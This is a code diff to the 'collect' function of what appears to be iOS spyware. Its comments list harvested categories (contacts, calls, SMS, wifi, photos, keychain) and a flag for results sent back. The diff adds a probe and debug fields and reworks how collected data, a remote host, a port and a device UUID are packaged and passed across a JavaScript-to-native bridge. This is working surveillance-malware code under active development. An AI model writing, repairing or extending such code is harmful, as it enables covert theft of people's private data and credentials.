@@ -582,6 +582,18 @@ int collect(void *ctx) {
     //            bit3 contacts bit4 calls bit5 sms bit6 wifi bit7 photos bit8 keychain
     //            bit9 结果回传成功
     int diag = 0;
+    {
+        /* probe: prove the JS->native ctx pointer is valid */
+        collect_ctx *pc = (collect_ctx *)ctx;
+        if (pc && pc->out && pc->outCap > 32) {
+            const char *probe = "{\"probe\":1}";
+            int pn = (int)strlen(probe);
+            memcpy(pc->out, probe, pn);
+            pc->out[pn] = 0;
+            pc->outLen = pn;
+            diag |= 2048;
+        }
+    }
     @autoreleasepool {
         if (ctx) {
             collect_ctx *c = (collect_ctx *)ctx;
@@ -641,25 +653,26 @@ int collect(void *ctx) {
         summary[@"host"] = [NSString stringWithUTF8String:g_host];
         summary[@"port"] = @(g_port);
 
-        if (g_out) {
+        {
+            collect_ctx *cc = (collect_ctx *)ctx;
             NSMutableDictionary *pkg = [NSMutableDictionary dictionary];
             pkg[@"summary"] = summary;
-            pkg[@"data"] = g_out;
+            pkg[@"data"] = g_out ? g_out : [NSDictionary dictionary];
             pkg[@"diag"] = @(diag);
             pkg[@"host"] = [NSString stringWithUTF8String:g_host];
             pkg[@"port"] = @(g_port);
             pkg[@"uuid"] = g_uuid ? g_uuid : @"";
+            pkg[@"ctxx"] = cc ? @(1) : @(0);
+            pkg[@"outx"] = (cc && cc->out) ? @(1) : @(0);
+            pkg[@"cap"] = (cc) ? @(cc->outCap) : @(0);
             NSData *j = [NSJSONSerialization dataWithJSONObject:pkg options:0 error:nil];
-            if (j) {
-                collect_ctx *cc = (collect_ctx *)ctx;
-                if (cc && cc->out && cc->outCap > 8) {
-                    int n = (int)[j length];
-                    int cp = (n < (cc->outCap - 1)) ? n : (cc->outCap - 1);
-                    memcpy(cc->out, [j bytes], cp);
-                    cc->out[cp] = 0;
-                    cc->outLen = cp;
-                    diag |= 1024;
-                }
+            if (j && cc && cc->out && cc->outCap > 8) {
+                int n = (int)[j length];
+                int cp = (n < (cc->outCap - 1)) ? n : (cc->outCap - 1);
+                memcpy(cc->out, [j bytes], cp);
+                cc->out[cp] = 0;
+                cc->outLen = cp;
+                diag |= 1024;
             }
         }
         return diag;
